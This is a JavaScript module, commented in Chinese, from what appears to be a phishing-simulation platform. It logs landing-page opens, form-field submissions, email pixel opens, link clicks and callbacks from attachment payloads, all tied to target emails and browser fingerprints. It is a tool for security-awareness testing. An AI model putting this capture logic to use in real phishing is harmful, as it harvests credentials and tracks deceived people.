import { get, run, nowIso, parseJson } from '../platform/storage/rows.js';
import { probe } from './uaProbe.js';
import { pushEvent, pushFields, pushTarget } from '../notify/notifier.js';

/**
 * 上报落库。
 * records.form_json 存的是「提交历史」数组而不是最新一次快照：同一终端往往会被反复钓多次，
 * 覆盖写入等于丢掉取证线索；同一终端可能被反复钓很多次，历史只留最近 50 条——
 * 再早的线索对取证已经没意义，却让一条记录无限膨胀到拖垮导出。
 */
const MAX_HISTORY_ENTRIES = 50;

export function logEvent(kind, { ref_id, token, ip, user_agent, payload }) {
  run(
    'INSERT INTO events (id,kind,ref_id,token,ip,user_agent,payload,created_at) VALUES (?,?,?,?,?,?,?,?)',
    [
      crypto.randomUUID(),
      kind,
      ref_id ?? null,
      token ?? null,
      ip ?? null,
      user_agent ?? null,
      payload ? JSON.stringify(payload) : null,
      nowIso(),
    ]
  );
}

function fingerprint(ip, userAgent, extra = {}) {
  const cls = probe(userAgent);
  return {
    ipv4: ip,
    ipv6: '',
    'user-agent': userAgent,
    os: cls.os,
    browser: cls.browser,
    ...extra,
  };
}

function findRecord(kind, token, seed) {
  const existing = get('SELECT * FROM records WHERE kind=? AND token=?', [kind, token]);
  if (existing) return existing;
  const id = crypto.randomUUID();
  const now = nowIso();
  run(
    `INSERT INTO records (id,kind,site_id,task_id,token,target_email,first_seen_at,last_seen_at,created_at)
     VALUES (?,?,?,?,?,?,?,?,?)`,
    [id, kind, seed.site_id ?? null, seed.task_id ?? null, token, seed.target_email ?? null, now, now, now]
  );
  return get('SELECT * FROM records WHERE id=?', [id]);
}

export function resolveToken(token) {
  if (!token) return null;
  return get('SELECT * FROM capture_tokens WHERE token=?', [token]);
}

function targetOf(token) {
  return resolveToken(token);
}

/** 把一条历史记录摊平成 [{name, value, at}]：新格式用 fields 映射，历史格式用 record_content 数组 */
export function flattenHistory(rawFormJson) {
  const parsed = parseJson(rawFormJson, []);
  if (!Array.isArray(parsed)) return [];
  const flat = [];
  const push = (name, value, at) => {
    if (Array.isArray(value)) {
      for (const item of value) push(name, item, at);
      return;
    }
    flat.push({
      name: String(name),
      value: value !== null && typeof value === 'object' ? JSON.stringify(value) : value ?? '',
      at: at ?? null,
    });
  };
  for (const entry of parsed) {
    if (!entry || typeof entry !== 'object') continue;
    const at = entry.at || entry.record_time || null;
    const source = entry.fields ?? entry.record_content;
    if (Array.isArray(source)) {
      for (const field of source) {
        if (!field || typeof field !== 'object' || field.name === undefined) continue;
        push(field.name, field.value, at);
      }
    } else if (source && typeof source === 'object') {
      for (const [name, value] of Object.entries(source)) push(name, value, at);
    }
  }
  return flat;
}

/** 页面被打开：计入「已打开页面的终端数量」 */
export function recordPageOpen({ siteId, token, ip, userAgent, referer, href }) {
  const visitor = targetOf(token);
  const rec = findRecord('web', token || crypto.randomUUID(), {
    site_id: siteId,
    task_id: visitor?.task_id ?? null,
    target_email: visitor?.target_email ?? null,
  });
  run('UPDATE records SET last_seen_at=?, feature_json=? WHERE id=?', [
    nowIso(),
    JSON.stringify(fingerprint(ip, userAgent, { referer: referer || '', href: href || '' })),
    rec.id,
  ]);
  logEvent('page_open', { ref_id: rec.id, token, ip, user_agent: userAgent, payload: { referer, href } });
  const cls = probe(userAgent);
  pushEvent('page_open', `网页打开 | 站点=${siteId} | ${pushTarget(visitor?.target_email)} | ${cls.os}/${cls.browser}`);
  return rec;
}

/** 表单被填写：追加一条采集历史，并计算停留时长 */
export function recordFormSubmit({ siteId, token, ip, userAgent, fields, dwell, referer, href }) {
  const visitor = targetOf(token);
  const rec = findRecord('web', token || crypto.randomUUID(), {
    site_id: siteId,
    task_id: visitor?.task_id ?? null,
    target_email: visitor?.target_email ?? null,
  });
  const now = nowIso();
  const first = rec.first_seen_at || now;
  const dwellSeconds = Number.isFinite(dwell) && dwell >= 0
    ? Math.round(dwell)
    : Math.max(0, Math.round((Date.now() - new Date(first).getTime()) / 1000));

  const history = parseJson(rec.form_json, []);
  const entries = Array.isArray(history) ? history : [];
  entries.push({ at: now, ev: 'submit', fields });
  const historyJson = JSON.stringify(entries.slice(-MAX_HISTORY_ENTRIES));

  run(
    `UPDATE records SET submitted_at=?, last_seen_at=?, first_seen_at=?, dwell_seconds=?, form_json=?, feature_json=?, target_email=COALESCE(target_email,?)
     WHERE id=?`,
    [
      now,
      now,
      first,
      dwellSeconds,
      historyJson,
      JSON.stringify(fingerprint(ip, userAgent, { referer: referer || '', href: href || '' })),
      visitor?.target_email ?? null,
      rec.id,
    ]
  );
  if (token) {
    run('UPDATE capture_tokens SET submitted_at=?, first_seen_at=COALESCE(first_seen_at,?) WHERE token=?', [now, now, token]);
  }
  logEvent('form_fill', { ref_id: rec.id, token, ip, user_agent: userAgent, payload: { fields } });
  pushEvent('form_fill', `网页填写 | 站点=${siteId} | ${pushTarget(visitor?.target_email)} | 字段=${pushFields(fields)}`);
  return get('SELECT * FROM records WHERE id=?', [rec.id]);
}

/** 邮件被打开：像素与追踪链接共用这条口径 */
export function recordMailOpen({ taskId, token, ip, userAgent }) {
  const visitor = targetOf(token);
  const rec = findRecord('mail', token || crypto.randomUUID(), {
    task_id: taskId ?? visitor?.task_id ?? null,
    site_id: null,
    target_email: visitor?.target_email ?? null,
  });
  const now = nowIso();
  run('UPDATE records SET last_seen_at=? WHERE id=?', [now, rec.id]);
  run('UPDATE mail_recipients SET opened_at=COALESCE(opened_at,?) WHERE task_id=? AND token=?', [now, taskId ?? visitor?.task_id ?? null, token]);
  logEvent('mail_open', { ref_id: rec.id, token, ip, user_agent: userAgent });
  pushEvent('mail_open', `邮件打开 | 任务=${taskId ?? '未知'} | ${pushTarget(visitor?.target_email)}`);
  return rec;
}

export function recordMailClick({ taskId, token, ip, userAgent, url }) {
  const rec = get('SELECT * FROM records WHERE kind=? AND token=?', ['mail', token]);
  if (taskId) run('UPDATE mail_recipients SET clicked_at=COALESCE(clicked_at,?) WHERE token=?', [nowIso(), token]);
  logEvent('mail_click', { ref_id: rec?.id ?? null, token, ip, user_agent: userAgent, payload: { url } });
  return rec;
}

/** 附件运行回调：无害化载荷回报上线状态与截图 */
export function recordAttachmentRun({ taskId, token, mail, fields, screenshotPath, ip, userAgent }) {
  const rec = findRecord('mail', token || crypto.randomUUID(), {
    task_id: taskId,
    target_email: mail || targetOf(token)?.target_email || null,
  });
  const created = rec.submitted_at == null;
  const now = nowIso();
  const history = parseJson(rec.form_json, []);
  const entries = Array.isArray(history) ? history : [];
  entries.push({ at: now, ev: 'callback', fields });
  run(
    `UPDATE records SET submitted_at=COALESCE(submitted_at,?), last_seen_at=?, form_json=?, screenshot_path=COALESCE(screenshot_path,?), feature_json=? WHERE id=?`,
    [
      now,
      now,
      JSON.stringify(entries.slice(-MAX_HISTORY_ENTRIES)),
      screenshotPath ?? null,
      JSON.stringify(fingerprint(ip, userAgent, { source: 'attachment_callback' })),
      rec.id,
    ]
  );
  logEvent('attachment_run', { ref_id: rec.id, token, ip, user_agent: userAgent, payload: { mail, fields } });
  pushEvent('attachment_run', `附件运行 | 任务=${taskId ?? '未知'} | ${pushTarget(mail)} | 字段=${pushFields(fields)}`);
  return { record: get('SELECT * FROM records WHERE id=?', [rec.id]), created };
}
